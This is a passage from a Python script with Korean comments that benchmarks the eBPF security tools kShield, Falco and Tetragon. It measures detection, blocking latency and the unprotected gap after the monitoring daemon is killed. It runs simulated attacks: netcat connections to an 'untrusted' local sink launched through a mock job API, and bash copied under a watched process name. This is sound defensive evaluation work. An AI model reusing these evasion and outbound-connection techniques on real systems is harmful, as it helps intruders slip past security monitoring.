        scenarios = [s for s in scenarios if s[0] != "nc_untrusted"]
    preflight(args, groups)

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    os.makedirs(RESULTS_DIR, exist_ok=True)
    logdir = os.path.join(RESULTS_DIR, f"cmp_detect_logs_{ts}")
    os.makedirs(logdir)
    out_path = os.path.join(RESULTS_DIR, f"cmp_detect_{ts}.csv")
    meta_path = os.path.join(RESULTS_DIR, f"cmp_detect_meta_{ts}.json")
    meta = collect_meta(args, groups)
    meta["untrusted_dest"] = f"{ip}:{args.untrusted_port}"
    with open(meta_path, "w", encoding="utf-8") as f:
        json.dump(meta, f, ensure_ascii=False, indent=2)
    rows = []

    try:
        sink = Sink(ip, args.untrusted_port)
    except OSError as e:
        die(f"Sink를 {ip}:{args.untrusted_port} 에 열지 못했습니다: {e} "
            "(포트 사용 중이면 --untrusted-port 로 바꾸세요)")
    log(f"신뢰되지 않은 목적지(Sink): {ip}:{args.untrusted_port}")

    try:
        for group in groups:
            log(f"\n=== [탐지] {group} ===")
            tool = make_tool(group, args, logdir, capture_events=True)
            server = None
            try:
                tool.start()
                if group == "kshield":
                    kshield_state_check(args, ip)
                server = start_server(args, logdir)
                for name, cmd, is_attack in scenarios:
                    for rep in range(1, args.repeats + 1):
                        resfile = f"/tmp/kcmp_{os.getpid()}_{name}_{rep}.res"
                        offset = tool.log_size()
                        acc0, bytes0 = sink.snapshot()
                        submit_job(args.host, args.port, f"{cmd}; echo rc=$? > {resfile}")
                        rc = wait_result(resfile, args.scenario_timeout)
                        time.sleep(args.settle)
                        acc1, bytes1 = sink.snapshot()
                        if not tool.healthy():
                            die(f"{group}: 실험 도중 도구(또는 이벤트 스트림)가 종료되어 이 그룹의 결과는 "
                                f"무효입니다. 로그 끝부분:\n{tool.tail()}")
                        new = tool.read_log_from(offset)
                        detected = any(m in new for m in tool.markers)
                        killed = rc == 137
                        if os.path.exists(resfile):
                            os.remove(resfile)
                        rows.append({"group": group, "scenario": name, "attack": int(is_attack),
                                     "rep": rep, "rc": "" if rc is None else rc,
                                     "killed": int(killed), "detected": int(detected),
                                     "accepted": acc1 - acc0, "leaked_bytes": bytes1 - bytes0})
                    sub = [r for r in rows if r["group"] == group and r["scenario"] == name]
                    log(f"  {name:<15} 탐지 {sum(r['detected'] for r in sub)}/{len(sub)}  "
                        f"SIGKILL {sum(r['killed'] for r in sub)}/{len(sub)}  "
                        f"연결수립 {sum(r['accepted'] > 0 for r in sub)}/{len(sub)}  "
                        f"유출바이트 {sum(r['leaked_bytes'] for r in sub)}")
                    if group == "off" and is_attack and not any(r["accepted"] for r in sub):
                        log("    [경고] 도구가 없는데도 Sink에 연결이 수립되지 않았습니다. "
                            "방화벽·주소를 확인하세요(이 그룹은 기준선입니다).")
            finally:
                stop_server(server)
                tool.stop()
                time.sleep(args.cooldown)
    finally:
        sink.close()
        if rows:
            with open(out_path, "w", newline="", encoding="utf-8") as f:
                w = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
                w.writeheader()
                w.writerows(rows)
        chown_tree(logdir)
        for p in (out_path, meta_path):
            if os.path.exists(p):
                chown_tree(p)
    log(f"\n결과: {out_path}\n메타데이터: {meta_path}")
    log("해석: killed = 프로세스가 SIGKILL(rc=137)로 종료됨. Falco는 탐지만 하므로 killed=0이 정상.\n"
        "      연결수립/유출바이트 = Sink가 실제로 받은 연결·데이터. 비동기 SIGKILL이라 차단돼도 "
        "연결이 수립될 수 있으며, 유출바이트가 0이면 첫 데이터가 나가기 전에 차단된 것이다.")


# ── latency ─────────────────────────────────────────────────────────────────
LATENCY_FIELDS = ["group", "rep", "phase", "event", "sig", "code_or_ret", "delta_ns"]

LATENCY_LINE_RE = re.compile(
    r"^(EXEC|CONNECT)_(SYNC_BLOCK|POST_EXIT) pid=(\d+)(?: tid=\d+)?"
    r"(?: ret=(-?\d+)| exit_code=(-?\d+) sig=(\d+)) delta_ns=(\d+)$"
)


def start_bpftrace(args, logdir, nc_path):
    logpath = os.path.join(logdir, "latency_probe.log")
    lf = open(logpath, "ab", buffering=0)
    proc = subprocess.Popen([args.bpftrace_bin, LATENCY_SCRIPT, nc_path],
                            stdout=lf, stderr=subprocess.STDOUT, start_new_session=True)
    end = time.time() + 20
    ready = False
    while time.time() < end:
        if proc.poll() is not None:
            break
        with open(logpath, "rb") as f:
            if b"latency_probe: target=" in f.read():
                ready = True
                break
        time.sleep(0.3)
    if not ready:
        terminate(proc, timeout=10)
        lf.close()
        with open(logpath, encoding="utf-8", errors="replace") as f:
            tail = f.read()
        die(f"bpftrace가 20초 안에 attach하지 못했습니다(root 권한·커널 BTF 확인). 로그:\n{tail}")
    return proc, lf, logpath


def stop_bpftrace(proc, lf):
    terminate(proc, timeout=10)
    if lf:
        lf.close()


def read_new_lines(path, offset):
    with open(path, "rb") as f:
        f.seek(offset)
        data = f.read()
    return data.decode("utf-8", "replace"), offset + len(data)


def parse_latency_lines(text):
    rows = []
    for line in text.splitlines():
        m = LATENCY_LINE_RE.match(line.strip())
        if not m:
            continue
        phase, event, _pid, ret, code, sig, delta_ns = m.groups()
        rows.append({
            "phase": phase.lower(), "event": event.lower(),
            "sig": sig or "", "code_or_ret": ret if ret is not None else code,
            "delta_ns": int(delta_ns),
        })
    return rows


def cmd_latency(args):
    require_root()
    groups = parse_groups(args)
    if not shutil.which(args.bpftrace_bin):
        die(f"{args.bpftrace_bin} 를 찾을 수 없습니다: sudo apt install -y bpftrace")
    if not os.path.isfile(LATENCY_SCRIPT):
        die(f"{LATENCY_SCRIPT} 없음")
    nc_path = shutil.which("nc")
    if not nc_path:
        die("nc 가 없어 latency 실험을 진행할 수 없습니다.")
    ip = resolve_untrusted_ip(args)
    scenarios = build_scenarios(ip, args.untrusted_port)
    attack_cmd = next(c for n, c, atk in scenarios if n == "nc_untrusted")
    preflight(args, groups)

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    os.makedirs(RESULTS_DIR, exist_ok=True)
    logdir = os.path.join(RESULTS_DIR, f"latency_logs_{ts}")
    os.makedirs(logdir)
    out_path = os.path.join(RESULTS_DIR, f"latency_raw_{ts}.csv")
    meta_path = os.path.join(RESULTS_DIR, f"latency_meta_{ts}.json")
    meta = collect_meta(args, groups)
    meta["untrusted_dest"] = f"{ip}:{args.untrusted_port}"
    meta["nc_path"] = nc_path
    with open(meta_path, "w", encoding="utf-8") as f:
        json.dump(meta, f, ensure_ascii=False, indent=2)

    rows = []
    try:
        sink = Sink(ip, args.untrusted_port)
    except OSError as e:
        die(f"Sink를 {ip}:{args.untrusted_port} 에 열지 못했습니다: {e} "
            "(포트 사용 중이면 --untrusted-port 로 바꾸세요)")
    log(f"신뢰되지 않은 목적지(Sink): {ip}:{args.untrusted_port} | nc={nc_path} | "
        f"그룹당 {args.repeats}회")

    try:
        for group in groups:
            log(f"\n=== [지연시간] {group} ===")
            tool = make_tool(group, args, logdir)
            server = None
            bt_proc = bt_lf = bt_path = None
            offset = 0
            try:
                tool.start()
                server = start_server(args, logdir)
                bt_proc, bt_lf, bt_path = start_bpftrace(args, logdir, nc_path)
                offset = os.path.getsize(bt_path)
                for rep in range(1, args.repeats + 1):
                    resfile = f"/tmp/kcmp_lat_{os.getpid()}_{group}_{rep}.res"
                    submit_job(args.host, args.port, f"{attack_cmd}; echo rc=$? > {resfile}")
                    wait_result(resfile, args.scenario_timeout)
                    if os.path.exists(resfile):
                        os.remove(resfile)
                    time.sleep(args.settle)
                    if bt_proc.poll() is not None:
                        die(f"{group}: bpftrace가 실험 도중 종료되었습니다. 로그: {bt_path}")
                    if not tool.healthy():
                        die(f"{group}: 도구가 실험 도중 종료되어 이 그룹의 결과는 무효입니다.\n"
                            f"{tool.tail()}")
                    text, offset = read_new_lines(bt_path, offset)
                    new_rows = parse_latency_lines(text)
                    if not new_rows:
                        log(f"  rep {rep:>2}: (관측된 이벤트 없음 — --settle을 늘려보거나 로그를 확인)")
                    for r in new_rows:
                        r["group"], r["rep"] = group, rep
                        rows.append(r)
                    summary = ", ".join(f"{r['phase']}/{r['event']}(sig={r['sig'] or '-'})="
                                        f"{r['delta_ns'] / 1000:.1f}us" for r in new_rows) or "-"
                    log(f"  rep {rep:>2}: {summary}")
            finally:
                if bt_proc:
                    stop_bpftrace(bt_proc, bt_lf)
                stop_server(server)
                tool.stop()
                time.sleep(args.cooldown)
    finally:
        sink.close()
        if rows:
            with open(out_path, "w", newline="", encoding="utf-8") as f:
                w = csv.DictWriter(f, fieldnames=LATENCY_FIELDS)
                w.writeheader()
                w.writerows(rows)
        chown_tree(logdir)
        for p in (out_path, meta_path):
            if os.path.exists(p):
                chown_tree(p)
    analyze_cmd = f"python3 attack/compare/compare_latency_stats.py {out_path}"
    if len(groups) >= 2:
        analyze_cmd += f" --compare {groups[0]},{groups[1]}"
    log(f"\n원시 결과: {out_path}\n메타데이터: {meta_path}")
    log(f"분석: {analyze_cmd}")
    log("해석: post_exit 행은 sig=9(SIGKILL로 실제로 죽음)와 sig=0(정상 종료, 안 막힌 것)을 "
        "반드시 구분해서 읽는다. sync_block 행의 delta_ns는 판정 로직 자체의 소요 시간이고, "
        "post_exit(sig=9) 행의 delta_ns는 '공격이 살아있던 시간(attack window)'이다.")


# ── restart-gap ───────────────────────────────────────────────────────────
RESTART_GAP_FIELDS = ["group", "trial", "gap_s", "timed_out", "attempts", "readout"]
RESTART_GAP_ATTACKER = "/tmp/kshield_restart_gap_raylet"


def cmd_restart_gap(args):
    """3.9절·4.6.1절이 각각 kShield/Tetragon(정성적 확인)과 Falco(N=1)로 따로
    보였던 '데몬을 kill -9로 죽이고 재기동하는 동안 실제로 몇 초나 무방비인가'를
    같은 방법론으로 N회 반복 측정한다.

    공격은 mock Ray Jobs API를 거치지 않고, watched_self[] 기본값("raylet")과
    정확히 일치하는 이름으로 복사한 바이너리를 직접 실행한다(§3.6/3.9와 동일한
    기법). 첫 버전은 HTTP job 제출 → mock 서버 → 셸 생성이라는 무거운 경로를
    썼는데, 이 경로 자체의 지연(수동 진단으로 확인: kShield의 진짜 gap은
    0.003~0.005초인데 이 경로로는 3.112초로 잘못 측정됨 — 원인은 이 경로의
    지연이 데몬 재기동 지연과 뒤섞였기 때문)이 측정하려는 커널 레벨 gap보다
    훨씬 커서, 재는 대상이 사실상 "job 제출 경로 자체의 오버헤드"로 바뀌어
    버렸다. 이번 버전은 그 경로를 완전히 걷어내고 공격을 직접 fork+exec한다.

    판정 기준은 도구에 따라 다르다(blocked_rc 클래스 속성으로 구분) — 실제로
    막는 도구(kshield/kshield_lsm/tetragon)는 공격 자신의 종료 코드(SIGKILL=137,
    LSM -EPERM=126)로 판정하고, 탐지만 하고 막지는 않는 도구(Falco, 4.5절)만
    로그 마커로 판정한다. 막는 도구를 로그로 판정하면 안 되는 이유: kShield는
    3.9절에서 커널에 핀된 BPF 프로그램이 데몬 생사와 무관하게 계속 SIGKILL을
    보낼 수 있음을 보였는데, 그 SIGKILL 이벤트를 로그로 남기는 건 유저스페이스
    데몬이다 — 데몬이 죽어 있는 동안엔 커널이 계속 막고 있어도 그걸 기록할
    프로세스가 없어 로그가 비어 있다. 로그 기준으로 재면 "실제 무방비 시간"이
    아니라 "데몬이 다시 떠서 로그를 찍기 시작하는 시간"을 재게 된다."""
    require_root()
    groups = [g for g in parse_groups(args) if g != "off"]
    if not groups:
        die("off 그룹은 재시작이 없어 이 실험 대상이 아닙니다. --groups로 지정하세요 "
            "(예: --groups kshield,falco,tetragon).")
    ip = resolve_untrusted_ip(args)
    preflight(args, groups)

    shutil.copyfile("/bin/bash", RESTART_GAP_ATTACKER)
    os.chmod(RESTART_GAP_ATTACKER, 0o755)

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    os.makedirs(RESULTS_DIR, exist_ok=True)
    logdir = os.path.join(RESULTS_DIR, f"restart_gap_logs_{ts}")
    os.makedirs(logdir)
    out_path = os.path.join(RESULTS_DIR, f"restart_gap_raw_{ts}.csv")
    meta_path = os.path.join(RESULTS_DIR, f"restart_gap_meta_{ts}.json")
    meta = collect_meta(args, groups)
    meta["untrusted_dest"] = f"{ip}:{args.untrusted_port}"
    meta["attacker_binary"] = RESTART_GAP_ATTACKER
    with open(meta_path, "w", encoding="utf-8") as f:
        json.dump(meta, f, ensure_ascii=False, indent=2)

    rows = []
    try:
        sink = Sink(ip, args.untrusted_port)
    except OSError as e:
        die(f"Sink를 {ip}:{args.untrusted_port} 에 열지 못했습니다: {e}")
    log(f"신뢰되지 않은 목적지(Sink): {ip}:{args.untrusted_port} | "
        f"공격자={RESTART_GAP_ATTACKER}(comm=raylet, watched_self[] 직접 매칭, mock 서버 안 거침) "
        f"| 그룹당 {args.repeats}회 | gap-timeout {args.gap_timeout}s")

    def probe_once():
        """watched_self[]에 등록된 이름(raylet)으로 직접 nc를 실행해 종료 코드를
        바로 받는다. 반환값은 정수 종료 코드(못 읽었으면 None)."""
        try:
            r = subprocess.run(
                [RESTART_GAP_ATTACKER, "-c",
                 f"nc -w 2 {ip} {args.untrusted_port} < /dev/null; echo rc=$?"],
                capture_output=True, text=True, timeout=args.probe_timeout)
        except subprocess.TimeoutExpired:
            return None
        m = re.search(r"rc=(-?\d+)", r.stdout)
        return int(m.group(1)) if m else None

    def is_blocked(tool, offset, rc):
        if tool.blocked_rc is not None:
            return rc in tool.blocked_rc
        return any(m in tool.read_log_from(offset) for m in tool.markers)

    def readout_name(tool):
        return "exit_code" if tool.blocked_rc is not None else "log_marker"

    try:
        for group in groups:
            log(f"\n=== [재시작 무방비 구간] {group} ===")
            # capture_events=False: 이 실험은 blocked_rc가 있는 도구를 공격 자신의
            # 종료 코드로 판정하고(Tetragon 포함), 없는 도구(Falco)만 자신의 표준
            # 로그로 판정한다 — 어느 쪽도 tetra 이벤트 스트림(tetra getevents)을
            # 읽지 않으므로, 그걸 붙였다 뗐다 하는 절차 자체가 순수한 측정 오버헤드다.
            # 꺼두면 respawn_fast()가 systemd MainPID 변화 + 정책 재적재만 기다리게
            # 되어 Tetragon 쪽 gap이 실제 재시작 시간에 더 가까워진다.
            tool = make_tool(group, args, logdir, capture_events=False)
            try:
                tool.start()

                baseline_ok = False
                for attempt in range(1, 4):
                    offset = tool.log_size()
                    rc = probe_once()
                    time.sleep(args.settle)
                    if is_blocked(tool, offset, rc):
                        baseline_ok = True
                        break
                    log(f"  [기준 확인 {attempt}/3 실패, rc={rc}] 재시도...")
                if not baseline_ok:
                    log(f"  [경고] 기준 공격이 {readout_name(tool)} 기준으로 3회 모두 "
                        f"확인되지 않아 이 그룹은 건너뜁니다.\n{tool.tail()}")
                    continue

                for trial in range(1, args.repeats + 1):
                    if not tool.healthy():
                        die(f"{group}: 트라이얼 {trial} 시작 전 도구가 이미 죽어 있습니다.\n{tool.tail()}")
                    t0 = time.monotonic()
                    tool.crash()
                    t_crash = time.monotonic()
                    # os.kill(pid, 0)로 "사라졌는지"를 폴링하면 안 된다 — 부모(이 스크립트)가
                    # 거두지(reap) 않은 자식은 죽은 뒤에도 좀비로 PID를 계속 차지해 존재
                    # 확인에 항상 "있음"으로 응답하므로, 매번 타임아웃(예전엔 3초)을 그냥
                    # 날리게 된다. Popen.wait()는 실제로 거두면서 커널이 정리를 끝내는
                    # 즉시(보통 수 ms) 반환한다. Tetragon은 systemd가 부모라 self.proc가
                    # 없으므로 해당 없음 — respawn_fast() 자체가 MainPID 변화를 기다린다.
                    wait_timed_out = False
                    if tool.proc is not None:
                        try:
                            tool.proc.wait(timeout=3)
                        except subprocess.TimeoutExpired:
                            wait_timed_out = True
                    t_wait = time.monotonic()
                    tool.respawn_fast()
                    t_respawn = time.monotonic()

                    detected_at = None
                    attempts = 0
                    deadline = t0 + args.gap_timeout
                    while time.monotonic() < deadline:
                        attempts += 1
                        offset = tool.log_size()
                        rc = probe_once()
                        if is_blocked(tool, offset, rc):
                            detected_at = time.monotonic()
                            break
                        time.sleep(args.poll_interval)

                    if trial <= 3:
                        t_end = detected_at or time.monotonic()
                        log(f"    [진단] crash={t_crash - t0:.3f}s "
                            f"wait={t_wait - t_crash:.3f}s(timeout={wait_timed_out}) "
                            f"respawn={t_respawn - t_wait:.3f}s "
                            f"probe={t_end - t_respawn:.3f}s(last rc={rc})")

                    gap = (detected_at - t0) if detected_at else None
                    rows.append({"group": group, "trial": trial,
                                 "gap_s": "" if gap is None else round(gap, 3),
                                 "timed_out": int(gap is None), "attempts": attempts,
                                 "readout": readout_name(tool)})
                    gap_str = f"TIMEOUT(>{args.gap_timeout}s)" if gap is None else f"{gap:.3f}s"
                    log(f"  trial {trial:>2}: {gap_str}  ({attempts}회 시도, {readout_name(tool)})")
                    time.sleep(args.cooldown)
            finally:
                tool.stop()
                time.sleep(args.cooldown)
    finally:
        sink.close()
        if os.path.exists(RESTART_GAP_ATTACKER):
            os.remove(RESTART_GAP_ATTACKER)
        if rows:
            with open(out_path, "w", newline="", encoding="utf-8") as f:
                w = csv.DictWriter(f, fieldnames=RESTART_GAP_FIELDS)
                w.writeheader()
                w.writerows(rows)
        chown_tree(logdir)
        for p in (out_path, meta_path):
            if os.path.exists(p):
                chown_tree(p)

    log(f"\n원시 결과: {out_path}\n메타데이터: {meta_path}")
    for group in groups:
        group_rows = [r for r in rows if r["group"] == group]
        if not group_rows:
            log(f"{group:<14}: 건너뜀 — 기준 공격 확인 3회 모두 실패(위 경고 참고). "
                "타임아웃이 아니라 아예 시도되지 않은 것이다.")
            continue
        vals = [r["gap_s"] for r in group_rows if r["gap_s"] != ""]
        n_timeout = sum(1 for r in group_rows if r["timed_out"])
        readout = group_rows[0]["readout"]
        if vals:
            mean = sum(vals) / len(vals)
            sd = (sum((v - mean) ** 2 for v in vals) / (len(vals) - 1)) ** 0.5 if len(vals) > 1 else 0.0
            log(f"{group:<14}: N={len(vals)} 평균 {mean:.3f}s ± {sd:.3f}s  [{readout}]"
                + (f"  (타임아웃 {n_timeout}건 별도)" if n_timeout else ""))
        else:
            log(f"{group:<14}: N={len(group_rows)} 전부 타임아웃  [{readout}] — "
                f"gap-timeout({args.gap_timeout}s) 안에 재탐지되지 않았습니다.")
    log("\n해석: gap_s는 kill -9 시점부터 재탐지 시점까지의 시간이다. blocked_rc가 있는 "
        "도구(kshield/kshield_lsm/tetragon)는 공격 자신의 종료 코드(exit_code)로, 탐지만 하고 "
        "막지는 않는 Falco는 로그 마커(log_marker)로 판정한다 — readout 열이 어느 쪽인지 보여준다. "
        "공격은 mock 서버/HTTP를 거치지 않고 직접 fork+exec하므로(watched_self[] 매칭), "
        "이 gap_s는 job 제출 경로의 오버헤드가 섞이지 않은 값이다 — 첫 버전(HTTP 경로)이 kShield의 "
        "gap을 3.112초로 보고한 건 전부 그 경로 자체의 지연이었고, 수동 진단(직접 kill+공격)으로는 "
        "0.003~0.005초였다. Tetragon은 커널 BPF 프로그램이 데몬 생사와 무관하게 유지될 수 있다는 것이 "
        "3.9절의 발견이므로, gap_s가 작더라도 그게 '데몬이 빨리 재시작돼서'인지 '애초에 커널 집행이 "
        "끊긴 적이 없어서'인지는 exit_code 기준으로도 완전히 구분되지 않는다 — 다만 이 경로에서는 "
        "job 제출 경로의 오버헤드가 없으므로 그 구분 불가능성 자체가 실제 값에 훨씬 가깝다.")


def parse_groups(args):
    groups = [g.strip() for g in args.groups.split(",") if g.strip()]
    bad = [g for g in groups if g not in ALL_GROUPS]
    if bad:
        die(f"알 수 없는 그룹: {bad} (가능: {ALL_GROUPS})")
    return groups


def build_parser():
    p = argparse.ArgumentParser(description="kShield-VirtualPatch vs Falco vs Tetragon 비교 실험")
    p.add_argument("--groups", default=DEFAULT_GROUPS, help=f"쉼표 구분 (가능: {','.join(ALL_GROUPS)})")
    p.add_argument("--host", default="127.0.0.1",
                   help="벤치마크 접속 주소. localhost가 ::1로 풀리면 IPv6 connect가 섞이므로 127.0.0.1 고정")
    p.add_argument("--port", type=int, default=8265)
    p.add_argument("--untrusted-ip", default="auto",
                   help="탐지 실험의 '신뢰되지 않은 목적지'로 쓸 VM의 비 loopback IPv4. auto = 기본 경로의 출발지 주소")
    p.add_argument("--untrusted-port", type=int, default=18080, help="Sink 수신 포트")
    p.add_argument("--tool-warmup", type=float, default=8.0, help="도구 기동 후 대기(초)")
    p.add_argument("--cooldown", type=float, default=5.0, help="블록 사이 대기(초)")
    p.add_argument("--kshield-args", default="",
                   help="kshield_vpatch(v3) 또는 kshield_vpatch_lsm 추가 인자(그룹에 맞는 쪽으로 전달)")
    p.add_argument("--bpftrace-bin", default="bpftrace", help="latency 서브커맨드에서 쓸 bpftrace 경로")
    p.add_argument("--falco-bin", default="falco")
    p.add_argument("--falco-engine", default="modern_ebpf", help="engine.kind 값")
    p.add_argument("--falco-extra", default="", help="falco 추가 인자")
    p.add_argument("--falco-default-rules", default="/etc/falco/falco_rules.yaml")
    p.add_argument("--tetra-bin", default="tetra")
    p.add_argument("--tetra-extra", default="--server-address unix:///var/run/tetragon/tetragon.sock",
                   help="tetra 공통 인자. 기본값은 standalone tarball 설치본의 unix 소켓")
    p.add_argument("--tetragon-service", default="tetragon")

    sub = p.add_subparsers(dest="cmd")
    sub.add_parser("check", help="사전 점검만 수행")

    pp = sub.add_parser("perf", help="성능 오버헤드 비교")
    pp.add_argument("--runs", type=int, default=10, help="그룹·워크로드당 총 반복 횟수")
    pp.add_argument("--rounds", type=int, default=2, help="ABBA 라운드 수(runs를 나누어떨어져야 함)")
    pp.add_argument("--count", type=int, default=500, help="런당 요청 수")
    pp.add_argument("--warmup", type=int, default=100, help="블록 시작 시 버리는 워밍업 요청 수")
    pp.add_argument("--workloads", default="normal,fork", help="normal 및/또는 fork")

    dd = sub.add_parser("detect", help="탐지·차단 비교")
    dd.add_argument("--repeats", type=int, default=10)
    dd.add_argument("--settle", type=float, default=1.5, help="시나리오 후 로그 반영 대기(초)")
    dd.add_argument("--scenario-timeout", type=float, default=10.0)

    ll = sub.add_parser("latency", help="exec/connect 차단까지 걸리는 시간(ns) 비교(bpftrace 필요)")
    ll.add_argument("--repeats", type=int, default=30)
    ll.add_argument("--settle", type=float, default=2.0,
                    help="rep마다 bpftrace 출력이 파일에 반영될 때까지 대기(초)")
    ll.add_argument("--scenario-timeout", type=float, default=10.0)

    rg = sub.add_parser("restart-gap", help="데몬 kill -9 후 재시작까지 실제 무방비 구간(초) 측정")
    rg.add_argument("--repeats", type=int, default=10, help="그룹당 kill+재시작 반복 횟수")
    rg.add_argument("--poll-interval", type=float, default=0.3, help="재탐지 확인 사이 대기(초)")
    rg.add_argument("--gap-timeout", type=float, default=15.0,
                    help="이 시간 안에 재탐지되지 않으면 타임아웃으로 기록(초)")
    rg.add_argument("--probe-timeout", type=float, default=5.0, help="공격 1회 완료 대기(초)")
    rg.add_argument("--settle", type=float, default=1.5,
                    help="기준 공격 확인 시 로그 반영 대기(초) — detect와 동일 기본값")
    return p


def main():
    parser = build_parser()
    args = parser.parse_args()
    handlers = {"check": cmd_check, "perf": cmd_perf, "detect": cmd_detect, "latency": cmd_latency,
                "restart-gap": cmd_restart_gap}
    if args.cmd not in handlers:
        parser.print_help()
        return
    handlers[args.cmd](args)


if __name__ == "__main__":
    main()
